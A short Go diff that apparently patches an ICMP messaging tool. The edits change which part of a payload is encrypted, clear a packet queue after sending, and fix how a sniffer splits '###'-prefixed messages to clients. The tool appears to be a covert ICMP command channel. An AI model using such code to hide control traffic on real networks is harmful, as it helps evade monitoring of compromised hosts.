@@ -210,7 +210,7 @@ func GenerateHeader(segment int, segmented bool, ip string) string {
 
 func MakePacket(payload string) {
 	if SSM {
-		payload = payload[0:3] + encrypt(payload[3:])
+		payload = payload[0:8] + encrypt(payload[8:])
 	}
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho,
@@ -257,6 +257,7 @@ func Send(message string, id int) {
 		SendPackets(clients[id], *c)
 	}
 	fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
+	PacketQueue = nil
 }
 
 func CheckTwoStrings(words []string) bool {
@@ -313,7 +314,7 @@ func sniffer() {
 	for packet := range source.Packets() {
 		payload := convert(packet.ApplicationLayer().Payload())
 		if strings.HasPrefix(payload, "###") {
-			parts := strings.Split(payload, "[")
+			parts := strings.SplitN(payload, "[", 2)
 
 			// get the part before "["
 			header := parts[0]
